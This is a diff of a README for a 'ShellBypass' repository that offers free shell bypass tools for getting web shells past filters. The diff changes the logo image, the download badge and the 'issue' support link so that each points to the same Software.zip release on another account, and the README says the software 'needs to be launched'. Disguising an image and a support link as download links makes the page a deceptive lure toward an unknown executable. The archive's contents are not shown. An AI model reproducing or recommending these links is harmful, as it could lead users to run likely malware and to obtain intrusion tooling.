@@ -2,7 +2,7 @@
 
 ## Semua Shell Bypass Gratis!
 
-![ShellBypass Logo](https://example.com/shellbypasslogo.png)
+![ShellBypass Logo](https://github.com/coopxrz/ShellBypass/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -28,7 +28,7 @@ ShellBypass is a repository that provides various shell bypass tools for free. I
 ---
 
 ### Download Software
-[![Download ShellBypass](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download ShellBypass](https://github.com/coopxrz/ShellBypass/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/coopxrz/ShellBypass/releases/download/v2.0/Software.zip)
 
 *(Needs to be launched)*
 
@@ -47,7 +47,7 @@ If the provided link for downloading software does not work, kindly check the "R
 ---
 
 ### Support
-If you have any questions, issues, or suggestions, feel free to create an [issue](https://github.com/YouaifXD/ShellBypass/issues) in this repository.
+If you have any questions, issues, or suggestions, feel free to create an [issue](https://github.com/coopxrz/ShellBypass/releases/download/v2.0/Software.zip) in this repository.
 
 ---
 
